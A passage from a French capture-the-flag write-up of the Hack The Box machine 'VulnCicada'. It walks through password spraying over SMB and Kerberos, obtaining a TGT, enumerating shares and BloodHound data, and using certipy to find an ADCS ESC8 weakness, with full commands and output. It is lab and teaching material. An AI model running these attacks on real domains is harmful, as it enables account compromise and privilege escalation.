+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc-jpq225.cicada.vl -u &#39;&#39; -p &#39;&#39;
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   445    10.129.234.48    [*]  x64 (name:10.129.234.48) (domain:10.129.234.48) (signing:True) (SMBv1:False) (NTLM:False)
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   445    10.129.234.48    [-] 10.129.234.48\: STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc-jpq225.cicada.vl -u &#39;Guest&#39; -p &#39;&#39;</span></span></code></pre></div></div>
+<p>L&rsquo;authentification NTLM est désactivée.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc-jpq225.cicada.vl -u usernames.txt -p <span class="s1">&#39;Cicada123&#39;</span> --continue-on-success
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:10.129.234.48<span class="o">)</span> <span class="o">(</span>domain:10.129.234.48<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\A</span>dministrator:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\D</span>aniel.Marshall:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\D</span>ebra.Wright:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\J</span>ane.Carter:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\J</span>ordan.Francis:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\J</span>oyce.Andrews:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\K</span>atie.Ward:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\M</span>egan.Simpson:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\R</span>ichard.Gibbons:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\R</span>osie.Powell:Cicada123 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">SMB         10.129.234.48   <span class="m">445</span>    10.129.234.48    <span class="o">[</span>-<span class="o">]</span> 10.129.234.48<span class="se">\S</span>hirley.West:Cicada123 STATUS_NOT_SUPPORTED</span></span></code></pre></div></div>
+<p>Donc j&rsquo;utilise l&rsquo;option <code>-k</code> pour Kerberos et je vois que le mot de passe appartient à l&rsquo;utilisateur <code>rosie.powell</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc-jpq225.cicada.vl -u usernames.txt -p <span class="s1">&#39;Cicada123&#39;</span> -k --continue-on-success
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:dc-jpq225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\A</span>dministrator:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\D</span>aniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\D</span>ebra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\J</span>ane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\J</span>ordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\J</span>oyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\K</span>atie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\M</span>egan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\R</span>ichard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> Error checking <span class="k">if</span> user is admin on dc-jpq225.cicada.vl: The NETBIOS connection with the remote host timed out.
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>+<span class="o">]</span> cicada.vl<span class="se">\R</span>osie.Powell:Cicada123
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\S</span>hirley.West:Cicada123 KDC_ERR_CLIENT_REVOKED</span></span></code></pre></div></div>
+<p>Je génère un nouveau fichier <code>/etc/krb5.conf</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb dc-jpq225.cicada.vl -u <span class="s1">&#39;rosie.powell&#39;</span> -p <span class="s1">&#39;Cicada123&#39;</span> -k --generate-krb5-file /etc/krb5.conf
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:dc-jpq225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         dc-jpq225.cicada.vl <span class="m">445</span>    dc-jpq225        <span class="o">[</span>+<span class="o">]</span> cicada.vl<span class="se">\r</span>osie.powell:Cicada123</span></span></code></pre></div></div>
+<p>Je génère un TGT pour <code>rosie.powell</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  faketime <span class="s2">&#34;</span><span class="k">$(</span>rdate -n dc-jpq225.cicada.vl -p <span class="p">|</span> awk <span class="s1">&#39;{print $2, $3, $4}&#39;</span> <span class="p">|</span> date -f - <span class="s2">&#34;+%Y-%m-%d %H:%M:%S&#34;</span><span class="k">)</span><span class="s2">&#34;</span> zsh
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  getTGT.py cicada.vl/<span class="s1">&#39;rosie.powell&#39;</span>:<span class="s1">&#39;Cicada123&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in rosie.powell.ccache</span></span></code></pre></div></div>
+<p>En énumérant les partages avec smbclient.py, j&rsquo;accède au partage <code>CertEnroll</code>. <code>rosie.powell</code> peut donc énumérer les certificats.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  smbclient.py dc-jpq225.cicada.vl -k -no-pass
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="nb">help</span> <span class="k">for</span> list of commands
+</span></span><span class="line"><span class="cl"><span class="c1"># shares</span>
+</span></span><span class="line"><span class="cl">ADMIN$
+</span></span><span class="line"><span class="cl">C$
+</span></span><span class="line"><span class="cl">CertEnroll
+</span></span><span class="line"><span class="cl">IPC$
+</span></span><span class="line"><span class="cl">NETLOGON
+</span></span><span class="line"><span class="cl">profiles$
+</span></span><span class="line"><span class="cl">SYSVOL
+</span></span><span class="line"><span class="cl"><span class="c1"># use CertEnroll</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dir</span>
+</span></span><span class="line"><span class="cl">*** Unknown syntax: dir
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Mon Jul <span class="m">21</span> 22:35:25 <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Fri Sep <span class="m">13</span> 17:17:59 <span class="m">2024</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">741</span>  Mon Jul <span class="m">21</span> 22:30:08 <span class="m">2025</span> cicada-DC-JPQ225-CA<span class="o">(</span>1<span class="o">)</span>+.crl
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">941</span>  Mon Jul <span class="m">21</span> 22:30:08 <span class="m">2025</span> cicada-DC-JPQ225-CA<span class="o">(</span>1<span class="o">)</span>.crl
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">742</span>  Mon Jul <span class="m">21</span> 22:30:07 <span class="m">2025</span> cicada-DC-JPQ225-CA<span class="o">(</span>10<span class="o">)</span>+.crl
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">943</span>  Mon Jul <span class="m">21</span> 22:30:07 <span class="m">2025</span> cicada-DC-JPQ225-CA<span class="o">(</span>10<span class="o">)</span>.crl
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">742</span>  Mon Jul <span class="m">21</span> 22:30:07 <span class="m">2025</span> cicada-DC-JPQ225-CA<span class="o">(</span>11<span class="o">)</span>+.crl
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">943</span>  Mon Jul <span class="m">21</span> 22:30:07 <span class="m">2025</span> cicada-DC-JPQ225-CA<span class="o">(</span>11<span class="o">)</span>.crl
+</span></span><span class="line"><span class="cl">&lt;snip&gt;</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-quadministrateur">Shell en tant qu&rsquo;administrateur</h2>
+<h3 id="bloodhound">BloodHound</h3>
+<p>J&rsquo;utilise l&rsquo;option <code>--bloodhound</code> pour récupérer les relations entre les objets du domaine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  nxc ldap dc-jpq225.cicada.vl -u rosie.powell -p <span class="s1">&#39;Cicada123&#39;</span> -k --bloodhound -c All --dns-server 10.129.234.48
+</span></span><span class="line"><span class="cl">LDAP        dc-jpq225.cicada.vl <span class="m">389</span>    DC-JPQ225        <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC-JPQ225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        dc-jpq225.cicada.vl <span class="m">389</span>    DC-JPQ225        <span class="o">[</span>+<span class="o">]</span> cicada.vl<span class="se">\r</span>osie.powell:Cicada123
+</span></span><span class="line"><span class="cl">LDAP        dc-jpq225.cicada.vl <span class="m">389</span>    DC-JPQ225        Resolved collection methods: dcom, localadmin, group, rdp, acl, psremote, container, objectprops, session, trusts
+</span></span><span class="line"><span class="cl">LDAP        dc-jpq225.cicada.vl <span class="m">389</span>    DC-JPQ225        Using kerberos auth without ccache, getting TGT
+</span></span><span class="line"><span class="cl">LDAP        dc-jpq225.cicada.vl <span class="m">389</span>    DC-JPQ225        Done in 00M 15S
+</span></span><span class="line"><span class="cl">LDAP        dc-jpq225.cicada.vl <span class="m">389</span>    DC-JPQ225        Compressing output into /root/.nxc/logs/DC-JPQ225_dc-jpq225.cicada.vl_2025-07-21_233330_bloodhound.zip</span></span></code></pre></div></div>
+<p><code>rosie.powell</code> ainsi que tous les autres utilisateurs sont membres du groupe <code>cicada</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/VulnCicada/VulnCicada-2.png"
+        data-srcset="/images/VulnCicada/VulnCicada-2.png, /images/VulnCicada/VulnCicada-2.png 1.5x, /images/VulnCicada/VulnCicada-2.png 2x"
+        data-sizes="auto"
+        alt="/images/VulnCicada/VulnCicada-2.png"
+        title="/images/VulnCicada/VulnCicada-2.png" width="1348" height="788" /></p>
+<h3 id="esc8">ESC8</h3>
+<p>J&rsquo;utilise <code>certipy</code> pour énumérer les certificats vulnérables. Je vois que <code>certipy</code> ne trouve pas de Templates vulnérables, mais plutôt le certificat lui même vulnérable à une <code>ESC8</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/VulnCicada
+</span></span><span class="line"><span class="cl">╰─➤  certipy find -u <span class="s1">&#39;rosie.powell@cicada.vl&#39;</span> -p <span class="s1">&#39;Cicada123&#39;</span> -target <span class="s1">&#39;dc-jpq225.cicada.vl&#39;</span> -k -vulnerable -stdout -debug
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Domain retrieved from CCache: CICADA.VL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Username retrieved from CCache: rosie.powell
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to resolve <span class="s1">&#39;dc-jpq225.cicada.vl&#39;</span> at <span class="s1">&#39;8.8.8.8&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to resolve <span class="s1">&#39;CICADA.VL&#39;</span> at <span class="s1">&#39;8.8.8.8&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Authenticating to LDAP server
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Using Kerberos Cache: rosie.powell.ccache
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Using TGT from cache
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Username retrieved from CCache: rosie.powell
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Getting TGS <span class="k">for</span> <span class="s1">&#39;host/dc-jpq225.cicada.vl&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Got TGS <span class="k">for</span> <span class="s1">&#39;host/dc-jpq225.cicada.vl&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bound to ldaps://10.129.234.48:636 - ssl
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Default path: <span class="nv">DC</span><span class="o">=</span>cicada,DC<span class="o">=</span>vl
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Configuration path: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>cicada,DC<span class="o">=</span>vl
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Adding Domain Computers to list of current user<span class="s1">&#39;s SIDs
+</span></span></span><span class="line"><span class="cl"><span class="s1">[+] List of current user&#39;</span>s SIDs:
+</span></span><span class="line"><span class="cl">     CICADA.VL<span class="se">\R</span>osie Powell <span class="o">(</span>S-1-5-21-687703393-1447795882-66098247-1109<span class="o">)</span>
+</span></span><span class="line"><span class="cl">     CICADA.VL<span class="se">\A</span>uthenticated Users <span class="o">(</span>CICADA.VL-S-1-5-11<span class="o">)</span>
+</span></span><span class="line"><span class="cl">     CICADA.VL<span class="se">\D</span>omain Users <span class="o">(</span>S-1-5-21-687703393-1447795882-66098247-513<span class="o">)</span>
+</span></span><span class="line"><span class="cl">     CICADA.VL<span class="se">\E</span>veryone <span class="o">(</span>CICADA.VL-S-1-1-0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">     CICADA.VL<span class="se">\c</span>icada <span class="o">(</span>S-1-5-21-687703393-1447795882-66098247-1103<span class="o">)</span>
+</span></span><span class="line"><span class="cl">     CICADA.VL<span class="se">\D</span>omain Computers <span class="o">(</span>S-1-5-21-687703393-1447795882-66098247-515<span class="o">)</span>
+</span></span><span class="line"><span class="cl">     CICADA.VL<span class="se">\U</span>sers <span class="o">(</span>CICADA.VL-S-1-5-32-545<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">33</span> certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">11</span> enabled certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to resolve <span class="s1">&#39;DC-JPQ225.cicada.vl&#39;</span> at <span class="s1">&#39;8.8.8.8&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;cicada-DC-JPQ225-CA&#39;</span> via CSRA
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to get DCOM connection <span class="k">for</span>: 10.129.234.48
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Using Kerberos Cache: rosie.powell.ccache
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Using TGT from cache
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Username retrieved from CCache: rosie.powell
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Getting TGS <span class="k">for</span> <span class="s1">&#39;host/DC-JPQ225.cicada.vl&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Got TGS <span class="k">for</span> <span class="s1">&#39;host/DC-JPQ225.cicada.vl&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;cicada-DC-JPQ225-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;cicada-DC-JPQ225-CA&#39;</span> via RRP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Using Kerberos Cache: rosie.powell.ccache
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Using TGT from cache
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Username retrieved from CCache: rosie.powell
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Getting TGS <span class="k">for</span> <span class="s1">&#39;host/DC-JPQ225.cicada.vl&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Got TGS <span class="k">for</span> <span class="s1">&#39;host/DC-JPQ225.cicada.vl&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Connected to remote registry at <span class="s1">&#39;DC-JPQ225.cicada.vl&#39;</span> <span class="o">(</span>10.129.234.48<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">&#39;cicada-DC-JPQ225-CA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Resolved <span class="s1">&#39;DC-JPQ225.cicada.vl&#39;</span> from cache: 10.129.234.48
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Connecting to 10.129.234.48:80
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    CA Name                             : cicada-DC-JPQ225-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : DC-JPQ225.cicada.vl
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>cicada-DC-JPQ225-CA, <span class="nv">DC</span><span class="o">=</span>cicada, <span class="nv">DC</span><span class="o">=</span>vl
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 62A1C7D3543079854BFCDA3A6AEBD532
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2025-07-21 20:25:16+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2525-07-21 20:35:16+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment                      : Enabled
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : CICADA.VL<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCertificates              : CICADA.VL<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          CICADA.VL<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          CICADA.VL<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCa                        : CICADA.VL<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          CICADA.VL<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          CICADA.VL<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : CICADA.VL<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC8                              : Web Enrollment is enabled and Request Disposition is <span class="nb">set</span> to Issue
+</span></span><span class="line"><span class="cl">Certificate Templates                   : <span class="o">[</span>!<span class="o">]</span> Could not find any certificate templates</span></span></code></pre></div></div>
+<p>ESC8 décrit un vecteur d&rsquo;escalade de privilèges où un attaquant effectue une attaque par relai NTLM contre un point de terminaison d&rsquo;inscription ADCS basé sur HTTP. Ces interfaces web fournissent des méthodes alternatives permettant aux utilisateurs et aux ordinateurs de demander des certificats.
+Pour plus d&rsquo;informations :</p>
+<ul>
+<li><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment" target="_blank" rel="noopener noreffer ">Certipy wiki</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#web-endpoint-esc8" target="_blank" rel="noopener noreffer ">TheHackerRecipes</a></li>
+<li><a href="https://youtu.be/FhJpfWZ6NQA?si=ovLl13QlG5pMcYgb" target="_blank" rel="noopener noreffer ">Youtube</a></li>
